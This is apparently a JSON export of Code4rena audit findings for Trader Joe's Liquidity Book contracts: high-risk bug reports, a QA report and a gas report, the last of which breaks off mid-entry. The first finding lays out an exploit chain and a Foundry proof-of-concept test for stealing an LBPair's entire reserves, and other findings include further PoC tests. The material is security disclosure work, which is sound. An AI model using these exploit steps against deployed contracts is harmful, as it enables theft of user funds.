_accruedDebts[_account][_id].debtX = _debtX;         _accruedDebts[_account][_id].debtY = _debtY;     } ```  The critical problem lies in \\_beforeTokenTransfer:  ``` if (_from != _to) {     if (_from != address(0) && _from != address(this)) {         uint256 _balanceFrom = balanceOf(_from, _id);         _cacheFees(_bin, _from, _id, _balanceFrom, _balanceFrom - _amount);     }     if (_to != address(0) && _to != address(this)) {         uint256 _balanceTo = balanceOf(_to, _id);         _cacheFees(_bin, _to, _id, _balanceTo, _balanceTo + _amount);     } } ```  Note that if \\_from or \\_to is the LBPair contract itself, \\_cacheFees won't be called on \\_from or \\_to respectively. This was presumably done because it is not expected that the LBToken address will receive any fees. It is expected that the LBToken will only hold tokens when user sends LP tokens to burn.   This is where the bug manifests - the LBToken address (and 0 address), will collect freshly minted LP token's fees from 0 to current accToken\\*PerShare value.  We can exploit this bug to collect the entire reserve assets. The attack flow is: - Transfer amount X to pair - Call pair.mint(), with the to address = pair address - call collectFees() with pair address as account -> pair will send to itself the fees! It is interesting that both OZ ERC20 implementation and LBToken implementation allow this, otherwise this exploit chain would not work - Pair will now think user sent in money, because the bookkeeping is wrong. \\_pairInformation.feesX.total is decremented in collectFees(), but the balance did not change. Therefore, this calculation will credit attacker with the fees collected into the pool: ``` uint256 _amountIn = _swapForY     ? tokenX.received(_pair.reserveX, _pair.feesX.total)     : tokenY.received(_pair.reserveY, _pair.feesY.total); ``` - Attacker calls swap() and receives reserve assets using the fees collected. - Attacker calls burn(), passing their own address in \\_to parameter. This will successfully burn the minted tokens from step 1 and give Attacker their deposited assets.  Note that if the contract did not have the entire collectFees code in an unchecked block, the loss would be limited to the total fees accrued: ``` if (amountX != 0) {     _pairInformation.feesX.total -= uint128(amountX); } if (amountY != 0) {     _pairInformation.feesY.total -= uint128(amountY); } ```  If attacker would try to overflow the feesX/feesY totals, the call would revert. Unfortunately, because of the unchecked block feesX/feesY would overflow and therefore there would be no problem for attacker to take the entire reserves.  ## Impact  Attacker can steal the entire reserves of the LBPair.  ## Proof of Concept  Paste this test in LBPair.Fees.t.sol:  ```     function testAttackerStealsReserve() public {         uint256 amountY=  53333333333333331968;         uint256 amountX = 100000;          uint256 amountYInLiquidity = 100e18;         uint256 totalFeesFromGetSwapX;         uint256 totalFeesFromGetSwapY;          addLiquidity(amountYInLiquidity, ID_ONE, 5, 0);         uint256 id;         (,,id ) = pair.getReservesAndId();         console.log(\"id before\" , id);          //swap X -> Y and accrue X fees         (uint256 amountXInForSwap, uint256 feesXFromGetSwap) = router.getSwapIn(pair, amountY, true);         totalFeesFromGetSwapX += feesXFromGetSwap;          token6D.mint(address(pair), amountXInForSwap);         vm.prank(ALICE);         pair.swap(true, DEV);         (uint256 feesXTotal, , uint256 feesXProtocol, ) = pair.getGlobalFees();          (,,id ) = pair.getReservesAndId();         console.log(\"id after\" , id);           console.log(\"Bob balance:\");         console.log(token6D.balanceOf(BOB));         console.log(token18D.balanceOf(BOB));         console.log(\"-------------\");          uint256 amount0In = 100e18;          uint256[] memory _ids = new uint256[](1); _ids[0] = uint256(ID_ONE);         uint256[] memory _distributionX = new uint256[](1); _distributionX[0] = uint256(Constants.PRECISION);         uint256[] memory _distributionY = new uint256[](1); _distributionY[0] = uint256(0);          console.log(\"Minting for BOB:\");         console.log(amount0In);         console.log(\"-------------\");          token6D.mint(address(pair), amount0In);         //token18D.mint(address(pair), amount1In);         pair.mint(_ids, _distributionX, _distributionY, address(pair));         uint256[] memory amounts = new uint256[](1);         console.log(\"***\");         for (uint256 i; i < 1; i++) {             amounts[i] = pair.balanceOf(address(pair), _ids[i]);             console.log(amounts[i]);         }         uint256[] memory profit_ids = new uint256[](1); profit_ids[0] = 8388608;         (uint256 profit_X, uint256 profit_Y) = pair.pendingFees(address(pair), profit_ids);         console.log(\"profit x\", profit_X);         console.log(\"profit y\", profit_Y);         pair.collectFees(address(pair), profit_ids);         (uint256 swap_x, uint256 swap_y) = pair.swap(true,BOB);          console.log(\"swap x\", swap_x);         console.log(\"swap y\", swap_y);          console.log(\"Bob balance after swap:\");         console.log(token6D.balanceOf(BOB));         console.log(token18D.balanceOf(BOB));         console.log(\"-------------\");          console.log(\"*****\");         pair.burn(_ids, amounts, BOB);           console.log(\"Bob balance after burn:\");         console.log(token6D.balanceOf(BOB));         console.log(token18D.balanceOf(BOB));         console.log(\"-------------\");      } ```   ## Tools Used  Manual audit, foundry  ## Recommended Mitigation Steps  Code should not exempt any address from \\_cacheFees(). Even address(0) is important, because attacker can collectFees for the 0 address to overflow the FeesX/FeesY variables, even though the fees are not retrievable for them. "}, {"title": "Wrong calculation in function `LBRouter._getAmountsIn` make user lose a lot of tokens when swap through JoePair (most of them will gifted to JoePair freely)", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/400", "labels": ["bug", "3 (High Risk)", "primary issue", "sponsor confirmed", "selected for report", "H-04"], "target": "2022-10-traderjoe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L725   # Vulnerability details   ## Vulnerable detail  Function `LBRouter._getAmountsIn` is a helper function to return the amounts in with given `amountOut`. This function will check the pair of `_token` and `_tokenNext` is `JoePair` or `LBPair` using `_binStep`. * If `_binStep == 0`, it will be a `JoePair` otherwise it will be an `LBPair`. ```solidity= if (_binStep == 0) {     (uint256 _reserveIn, uint256 _reserveOut, ) = IJoePair(_pair).getReserves();     if (_token > _tokenPath[i]) {         (_reserveIn, _reserveOut) = (_reserveOut, _reserveIn);     }       uint256 amountOut_ = amountsIn[i];     // Legacy uniswap way of rounding     amountsIn[i - 1] = (_reserveIn * amountOut_ * 1_000) / (_reserveOut - amountOut_ * 997) + 1; } else {     (amountsIn[i - 1], ) = getSwapIn(ILBPair(_pair), amountsIn[i], ILBPair(_pair).tokenX() == _token); } ``` As we can see when `_binStep == 0` and `_token < _tokenPath[i]` (in another word  we swap through `JoePair` and pair's`token0` is `_token` and `token1` is `_tokenPath[i]`), it will  1. Get the reserve of pair (`reserveIn`, `reserveOut`)  2. Calculate the `_amountIn` by using the formula  ``` amountsIn[i - 1] = (_reserveIn * amountOut_ * 1_000) / (_reserveOut - amountOut_ * 997) + 1 ```  But unfortunately the denominator `_reserveOut - amountOut_ * 997` seem incorrect. It should be `(_reserveOut - amountOut_) * 997`.  We will do some math calculations here to prove the expression above is wrong.   **Input:**  * `_reserveIn (rIn)`: reserve of `_token` in pair  * `_reserveOut (rOut)`: reserve of `_tokenPath[i]` in pair  * `amountOut_`: the amount of `_tokenPath` the user wants to gain    **Output:**  * `rAmountIn`: the actual amount of `_token` we need to transfer to the pair.   **Generate Formula**  Cause `JoePair` [takes 0.3%](https://help.traderjoexyz.com/en/welcome/faq-and-help/general-faq#what-are-trader-swap-joe-fees) of `amountIn` as fee, we get  * `amountInDeductFee = amountIn' * 0.997`  Following the [constant product formula](https://docs.uniswap.org/protocol/V2/concepts/protocol-overview/glossary#constant-product-formula), we have  ```     rIn * rOut = (rIn + amountInDeductFee) * (rOut - amountOut_) ==> rIn + amountInDeductFee = rIn * rOut / (rOut - amountOut_) + 1 <=> amountInDeductFee = (rIn * rOut) / (rOut - amountOut_) - rIn + 1 <=> rAmountIn * 0.997 = rIn * amountOut / (rOut - amountOut_) + 1 <=> rAmountIn = (rIn * amountOut * 1000) / ((rOut - amountOut_) * 997) + 1 <=>  ```  As we can see `rAmountIn` is different from `amountsIn[i - 1]`, the denominator of `rAmountIn` is `(rOut - amountOut_) * 997` when the denominator of `amountsIn[i - 1]` is `_reserveOut - amountOut_ * 997` (Missing one bracket)  ## Impact **Loss of fund: User will send a lot of tokenIn (much more than expected) but just gain exact amountOut in return.**   Let dive in the function `swapTokensForExactTokens()` to figure out why this scenario happens. I will assume I just swap through only one pool from `JoePair` and 0 pool from `LBPair`.  * Firstly function will get the list `amountsIn` from function `_getAmountsIn`. So `amountsIn` will be [`incorrectAmountIn`, `userDesireAmount`].      ```solidity=             // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L440     amountsIn = _getAmountsIn(_pairBinSteps, _pairs, _tokenPath, _amountOut);     ```  * Then it transfers `incorrectAmountIn` to `_pairs[0]` to prepare for the swap.      ```solidity=     // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L444     _tokenPath[0].safeTransferFrom(msg.sender, _pairs[0], amountsIn[0]);     ```   * Finally it calls function `_swapTokensForExactToken` to execute the swap.      ```solidity=     // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L446         uint256 _amountOutReal = _swapTokensForExactTokens(_pairs, _pairBinSteps, _tokenPath, amountsIn, _to);     ```     In this step it will reach to [line 841](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L841) which will set the expected `amountOut = amountsIn[i+1] = amountsIn[1] = userDesireAmount`.     ```solidity=     // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L841     amountOut = _amountsIn[i + 1];     ```     So after calling `IJoePair(_pair).swap()`, the user just gets exactly `amountOut` and wastes a lot of tokenIn that (s)he transfers to the pool.    ## Proof of concept  Here is our test script to describe the impacts  * https://gist.github.com/huuducst/6e34a7bdf37bb29f4b84d2faead94dc4  You can place this file into `/test` folder and run it using  ```bash= forge test --match-test testBugSwapJoeV1PairWithLBRouter --fork-url https://rpc.ankr.com/avalanche --fork-block-number 21437560 -vv ```  Explanation of test script: (For more detail u can read the comments from test script above) 1. Firstly we get the Joe v1 pair WAVAX/USDC from JoeFactory. 2. At the forked block, price `WAVAX/USDC` was around 15.57. We try to use LBRouter function `swapTokensForExactTokens` to swap 10$ WAVAX (10e18 wei) to 1$ USDC (1e6 wei). But it reverts with the error `LBRouter__MaxAmountInExceeded`. But when we swap directly to JoePair, it swap successfully 10$ AVAX (10e18 wei) to 155$ USDC (155e6 wei). 3. We use LBRouter function `swapTokensForExactTokens` again with very large `amountInMax` to swap 1$ USDC (1e6 wei). It swaps successfully but needs to pay a very large amount WAVAX (much more than price).  ## Tools Used Foundry    ## Recommended Mitigation Steps Modify function `LBRouter._getAmountsIn` as follow ```solidity= // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L717-L728 if (_binStep == 0) {     (uint256 _reserveIn, uint256 _reserveOut, ) = IJoePair(_pair).getReserves();     if (_token > _tokenPath[i]) {         (_reserveIn, _reserveOut) = (_reserveOut, _reserveIn);     }       uint256 amountOut_ = amountsIn[i];     // Legacy uniswap way of rounding     // Fix here      amountsIn[i - 1] = (_reserveIn * amountOut_ * 1_000) / ((_reserveOut - amountOut_) * 997) + 1; } else {     (amountsIn[i - 1], ) = getSwapIn(ILBPair(_pair), amountsIn[i], ILBPair(_pair).tokenX() == _token); } ``` "}, {"title": "Wrong implementation of function `LBPair.setFeeParameter` can break the funcionality of LBPair and make user's tokens locked ", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/384", "labels": ["bug", "3 (High Risk)", "primary issue", "sponsor confirmed", "selected for report", "H-03"], "target": "2022-10-traderjoe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L905-L917   # Vulnerability details  ## Vulnerable detail  Struct `FeeParameters` contains 12 fields as follows:  ```solidity= struct FeeParameters {     // 144 lowest bits in slot      uint16 binStep;     uint16 baseFactor;     uint16 filterPeriod;      uint16 decayPeriod;      uint16 reductionFactor;      uint24 variableFeeControl;     uint16 protocolShare;     uint24 maxVolatilityAccumulated;           // 112 highest bits in slot      uint24 volatilityAccumulated;     uint24 volatilityReference;     uint24 indexRef;     uint40 time;  } ``` Function [`LBPair.setFeeParamters(bytes _packedFeeParamters)`](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L788-L790) is used to set the first 8 fields which was stored in 144 lowest bits of `LBPair._feeParameter`'s slot to 144 lowest bits of `_packedFeeParameters` (The layout of `_packedFeeParameters` can be seen [here](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L572-L584)). ```solidity= /// url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L905-L917  /// @notice Internal function to set the fee parameters of the pair /// @param _packedFeeParameters The packed fee parameters function _setFeesParameters(bytes32 _packedFeeParameters) internal {     bytes32 _feeStorageSlot;     assembly {         _feeStorageSlot := sload(_feeParameters.slot)     }      /// [#explain]  it will get 112 highest bits of feeStorageSlot,     ///             and stores it in the 112 lowest bits of _varParameters      uint256 _varParameters          = _feeStorageSlot.decode(type(uint112).max, _OFFSET_VARIABLE_FEE_PARAMETERS/*=144*/);      /// [#explain]  get 144 lowest bits of packedFeeParameters      ///             and stores it in the 144 lowest bits of _newFeeParameters       uint256 _newFeeParameters = _packedFeeParameters.decode(type(uint144).max, 0);      assembly {         // [$audit-high] wrong operation `or` here          //              Mitigate: or(_newFeeParameters, _varParameters << 144)             sstore(_feeParameters.slot, or(_newFeeParameters, _varParameters))     } } ``` As we can see in the implementation of `LBPair._setFeesParametes` above, it gets the 112 highest bits of `_feeStorageSlot` and stores it in the 112 lowest bits of `_varParameter`. Then it gets the 144 lowest bits of `packedFeeParameter` and stores it in the 144 lowest bits of `_newFeeParameters`.   Following the purpose of function `setFeeParameters`, the new `LBPair._feeParameters` should form as follow:  ``` // keep 112 highest bits remain unchanged  // set 144 lowest bits to `_newFeeParameter` [...112 bits...][....144 bits.....] [_varParameters][_newFeeParameters] ``` It will make `feeParameters = _newFeeParameters | (_varParameters << 144)`. But current implementation just stores the `or` value of `_varParameters` and `_newFeeParameter` into `_feeParameters.slot`. It forgot to shift left the `_varParameters` 144 bits before executing `or` operation.   This will make the value of `binStep`, ..., `maxVolatilityAccumulated` incorrect, and also remove the value (make the bit equal to 0) of `volatilityAccumulated`, ..., `time`.  ## Impact * Incorrect fee calculation when executing an action with LBPair (swap, flashLoan, mint) * Break the functionality of LBPair. The user can't swap/mint/flashLoan --> Make all the tokens stuck in the pools   ## Proof of concept  Here is our test script to describe the impacts  * https://gist.github.com/WelToHackerLand/012e44bb85420fb53eb0bbb7f0f13769  You can place this file into `/test` folder and run it using  ```bash= forge test --match-contract High1Test -vv ```  Explanation of test script: 1. First we create a pair with `binStep = DEFAULT_BIN_STEP = 25` 2. We do some actions (add liquidity -> mint -> swap) to increase the value of `volatilityAccumulated` from `0` to `60000` 3. We call function `factory.setFeeParametersOnPair` to set new fee parameters.  4. After that the value of `volatilityAccumulated` changed to value `0` (It should still be unchanged after `factory.setFeeParametersOnPair`)  5. We check the value of `binStep` and it changed from`25` to `60025`      * `binStep` has that value because [line 915](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L915) set `binStep = uint16(volatilityAccumulated) | binStep = 60000 | 25 = 60025`.  6. This change of `binStep` value will break all the functionality of `LBPair` cause `binStep > Constant.BASIS_POINT_MAX = 10000`  --> `Error: BinStepOverflows`    ## Tools Used Foundry    ## Recommended Mitigation Steps Modify function `LBPair._setFeesParaters` as follow:  ```solidity= /// url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L905-L917 function _setFeesParameters(bytes32 _packedFeeParameters) internal {     bytes32 _feeStorageSlot;     assembly {         _feeStorageSlot := sload(_feeParameters.slot)     }       uint256 _varParameters = _feeStorageSlot.decode(type(uint112).max, _OFFSET_VARIABLE_FEE_PARAMETERS);     uint256 _newFeeParameters = _packedFeeParameters.decode(type(uint144).max, 0);       assembly {         sstore(_feeParameters.slot, or(_newFeeParameters, shl(144, _varParameters)))     } } ```  "}, {"title": "Incorrect output amount calculation for Trader Joe V1 pools", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/345", "labels": ["bug", "3 (High Risk)", "primary issue", "sponsor confirmed", "selected for report", "H-02"], "target": "2022-10-traderjoe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L891 https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L896   # Vulnerability details  ## Impact Output amount is calculated incorrectly for a Trader Joe V1 pool when swapping tokens across multiple pools and some of the pools in the chain are V1 ones. Calculated amounts will always be smaller than expected ones, which will always affect chained swaps that include V1 pools. ## Proof of Concept [LBRouter](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L21) is a high-level contract that serves as the main contract users will interact with. The contract implements a lot of security checks and helper functions that make usage of LBPair contracts easier and more user-friendly. Some examples of such functions: - [swapExactTokensForTokensSupportingFeeOnTransferTokens](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L531), which makes chained swaps (i.e. swaps between tokens that don't have a pair) of tokens implementing fee on transfer (i.e. there's fee reduced from every transferred amount); - [swapExactTokensForAVAXSupportingFeeOnTransferTokens](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L561), which is the variation of the above function which takes AVAX as the output token; - [swapExactAVAXForTokensSupportingFeeOnTransferTokens](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L594), which is the variation of the previous function which takes AVA as the input token.  Under the hood, these three functions call [_swapSupportingFeeOnTransferTokens](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L864), which is the function that actually performs swaps. The function supports both Trader Joe V1 and V2 pools: when `_binStep` is 0 (which is never true in V2 pools), it's assumed that the current pool is a V1 one. For V1 pools, the function calculates output amounts based on pools' reserves and balances: ```solidity if (_binStep == 0) {     (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();     if (_token < _tokenNext) {         uint256 _balance = _token.balanceOf(_pair);         uint256 _amountOut = (_reserve1 * (_balance - _reserve0) * 997) / (_balance * 1_000);          IJoePair(_pair).swap(0, _amountOut, _recipient, \"\");     } else {         uint256 _balance = _token.balanceOf(_pair);         uint256 _amountOut = (_reserve0 * (_balance - _reserve1) * 997) / (_balance * 1_000);          IJoePair(_pair).swap(_amountOut, 0, _recipient, \"\");     } } else {     ILBPair(_pair).swap(_tokenNext == ILBPair(_pair).tokenY(), _recipient); } ``` However, these calculations are incorrect. Here's the difference: ```diff @@ -888,12 +888,14 @@ contract LBRouter is ILBRouter {                      (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();                      if (_token < _tokenNext) {                          uint256 _balance = _token.balanceOf(_pair); -                        uint256 _amountOut = (_reserve1 * (_balance - _reserve0) * 997) / (_balance * 1_000); +                        uint256 amountInWithFee = (_balance - _reserve0) * 997; +                        uint256 _amountOut = (_reserve1 * amountInWithFee) / (_reserve0 * 1_000 + amountInWithFee);                           IJoePair(_pair).swap(0, _amountOut, _recipient, \"\");                      } else {                          uint256 _balance = _token.balanceOf(_pair); -                        uint256 _amountOut = (_reserve0 * (_balance - _reserve1) * 997) / (_balance * 1_000); +                        uint256 amountInWithFee = (_balance - _reserve1) * 997; +                        uint256 _amountOut = (_reserve0 * amountInWithFee) / (_reserve1 * 1_000 + amountInWithFee);                           IJoePair(_pair).swap(_amountOut, 0, _recipient, \"\");                      } ```  These calculations are implemented correctly in [JoeLibrary.getAmountOut](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/libraries/JoeLibrary.sol#L30-L41), which is used in [LBQuoter](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBQuoter.sol#L83).  Also it's used in Trader Joe V1 to calculate output amounts in similar functions: - https://github.com/traderjoe-xyz/joe-core/blob/main/contracts/traderjoe/JoeRouter02.sol#L375  ```solidity // test/audit/RouterMath2.t.sol // SPDX-License-Identifier: UNLICENSED  pragma solidity ^0.8.7;  import \"../TestHelper.sol\";  import \"../../src/LBRouter.sol\"; import \"../../src/interfaces/IJoePair.sol\";  contract RouterMath2Test is TestHelper {     IERC20 internal token;     uint256 internal actualAmountOut;      function setUp() public {         token = new ERC20MockDecimals(18);         ERC20MockDecimals(address(token)).mint(address(this), 100e18);          router = new LBRouter(             ILBFactory(address(0x00)),             IJoeFactory(address(this)),             IWAVAX(address(0x02))         );     }      // Imitates V1 factory.     function getPair(address, /*tokenX*/ address /*tokenY*/ ) public view returns (address) {         return address(this);     }      // Imitates V1 pool.     function getReserves() public pure returns (uint112, uint112, uint32) {         return (1e18, 1e18, 0);     }      // Imitates V1 pool.     function balanceOf(address /*acc*/) public pure returns (uint256) {         return 0.0001e18;     }      // Imitates V1 pool.     function swap(uint256 amount0, uint256 amount1, address to, bytes memory data) public {         actualAmountOut = amount0 == 0 ? amount1 : amount0;     }      function testScenario() public {         // Setting up a swap via one V1 pool.         uint256[] memory steps = new uint256[](1);         steps[0] = 0;          IERC20[] memory path = new IERC20[](2);         path[0] = IERC20(address(token));         path[1] = IERC20(address(this));          uint256 amountIn = 0.0001e18;          token.approve(address(router), 1e18);         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(             amountIn, 0, steps, path, address(this), block.timestamp + 1000         );         // This amount was calculated incorrectly.         assertEq(actualAmountOut, 987030000000000000); // Equals to 989970211528238869 when fixed.           address _pair = address(this);         uint256 expectedAmountOut;          // Reproduce the calculations using JoeLibrary.getAmountIn. This piece:         // https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L888-L899         (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();         if (address(token) < address(this)) {             uint256 _balance = token.balanceOf(_pair);             expectedAmountOut = JoeLibrary.getAmountOut(_balance - _reserve0, _reserve0, _reserve1);         } else {             uint256 _balance = token.balanceOf(_pair);             expectedAmountOut = JoeLibrary.getAmountOut(_balance - _reserve1, _reserve1, _reserve0);         }          // This is the correct amount.         assertEq(expectedAmountOut, 989970211528238869);          // The wrong amount is smaller than the expected one.         assertEq(expectedAmountOut - actualAmountOut, 2940211528238869);     } } ``` ## Tools Used Manual review. ## Recommended Mitigation Steps Consider using the `JoeLibrary.getAmountOut` function in the `_swapSupportingFeeOnTransferTokens` function of `LBRouter` when computing output amounts for V1 pools."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/334", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "grade-a", "selected for report", "Q-07"], "target": "2022-10-traderjoe-findings", "body": "## Low & QA 1. Missing sanity checks on `to` addresses in `LBRouter.sol` 2. Rug vectors by the owner 3. All tokens send to a pair that are not immediately used can be stolen 4. Potential loss of funds on tokens with big supplies 5. In `TokenHelper.sol` the `safeTransfer` function does not check for potentially self-destroyed tokens   ### 1. Missing sanity checks on `to` addresses in `LBRouter.sol`  All the public/external functions in `LBRouter.sol` require an address `to` as a parameter to which to send either tokens, LBtokens or ETH. When tokens or LBtokens are sent the protocol should check that if the `to` address is contract then that contract should is able to manage `ERC20/LBTokens`, otherwise funds would be lost.  ### 2. Rug vectors by the owner  A malicious owner can call `setLBPairImplementation()`, `setFeeRecipient()`, `setFlashLoanFee()` , `setFeesParameters()` and `forceDecay()` to advantage himself at expenses of the users.  - `setLBPairImplementation()`: can be used to silently frontun a pair creation by swapping the implementation with a malicious one and stealing potentially any deposit. - `setFeeRecipient()`: can be used to steal all of the protocol fees not yet collected. - `setFlashLoanFee()`: can be used to frontrun a flashloan by increasing the fee, if the flashloan returns the fee based on the callback parameters. - `setFeesParameters()`: can set the protocol fee to the max 25% and gets the funds for himself in combination with `setFeeRecipient()`. - `forceDecay()`: can be used to advantage himself in trades.  As a mitigation add a timelock and make sure the owner is a multisig and not an EOA.  ### 3. All tokens send to a pair that are not immediately used can be stolen  If extra tokens are sent the a pair contract either by mistake or intentionally and they are not used immetiately (calling either `mint()`, `burn()` or `swap()`) they become available for anybody to frontrun and claim by simply calling `mint()` and `burn()`.  ### 4. Potential loss of funds on tokens with big supplies  `swap()` and `mint()` both reverts if either `2^112` or `2^128` tokens are sent to the pair. This would result in the funds being stuck and nobody being able to mint or swap. Submitting as low because the cost of attack is extremely high, but it's good to be aware of it.  ### 5. In `TokenHelper.sol` the `safeTransfer` function does not check for potentially self-destroyed tokens.  If a pair gets created and after a while one of the tokens gets self-destroyed (maybe because of a bug) then `safeTransfer` would still succeed. It's probably a good idea to check if the contract still exists by checking the bytecode length. "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/326", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "grade-b", "G-10"], "target": "2022-10-traderjoe-findings", "body": "## Summary  ### Gas Optimizations | |Issue|Instances|Total Gas Saved| |-|:-|:-:|:-:| | [G&#x2011;01] | Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate | 1 | - | | [G&#x2011;02] | State variables can be packed into fewer storage slots | 1 | - | | [G&#x2011;03] | Using `storage` instead of `memory` for structs/arrays saves gas | 11 | 46200 | | [G&#x2011;04] | Avoid contract existence checks by using low level calls | 28 | 2800 | | [G&#x2011;05] | Multiple accesses of a mapping/array should use a local variable cache | 1 | 42 | | [G&#x2011;06] | Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement | 5 | 425 | | [G&#x2011;07] | `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops | 5 | 300 | | [G&#x2011;08] | Optimize names to save gas | 11 | 242 | | [G&#x2011;09] | Use a more recent version of solidity | 37 | - | | [G&#x2011;10] | `>=` costs less gas than `>` | 1 | 3 | | [G&#x2011;11] | Functions guaranteed to revert when called by normal users can be marked `payable` | 20 | 420 |  Total: 121 instances over 11 issues with **50432 gas** saved  Gas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above and its gas values do not include any excluded findings.    ## Gas Optimizations  ### [G&#x2011;01]  Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save **~42 gas per access** due to [not having to recalculate the key's keccak256 hash](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0) (Gkeccak256 - 30 gas) and that calculation's associated stack operations.  *There is 1 instance of this issue:* ```solidity File: src/LBPair.sol  68        mapping(address => bytes32) private _unclaimedFees; 69        /// @dev Mapping from account to id to user's accruedDebt. 70:       mapping(address => mapping(uint256 => Debts)) private _accruedDebts;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L68-L70  ### [G&#x2011;02]  State variables can be packed into fewer storage slots If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (**20000 gas**). Reads of the variables can also be cheaper  *There is 1 instance of this issue:* ```solidity File: src/LBFactory.sol  /// @audit Variable ordering with 8 slots instead of the current 9: ///           move bool(1):creationUnlocked to be right after address(20):feeRecipient 32:       address public override LBPairImplementation;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L32  ### [G&#x2011;03]  Using `storage` instead of `memory` for structs/arrays saves gas When fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct  *There are 11 instances of this issue:* ```solidity File: src/LBFactory.sol  197:                          LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenA][_tokenB][i];  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L197  ```solidity File: src/LBPair.sol  220:              FeeHelper.FeeParameters memory _fp = _feeParameters;  283:                      Bin memory _bin = _bins[_id];  310:          PairInformation memory _pair = _pairInformation;  318:          FeeHelper.FeeParameters memory _fp = _feeParameters;  327:              Bin memory _bin = _bins[_pair.activeId];  426:          FeeHelper.FeeParameters memory _fp = _feeParameters;  484:          PairInformation memory _pair = _pairInformation;  486:          FeeHelper.FeeParameters memory _fp = _feeParameters;  498:                  Bin memory _bin = _bins[_mintInfo.id];  706:                      Bin memory _bin = _bins[_id];  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L220   ### [G&#x2011;04]  Avoid contract existence checks by using low level calls Prior to 0.8.10 the compiler inserted extra code, including `EXTCODESIZE` (**100 gas**), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence  *There are 28 instances of this issue:* ```solidity File: 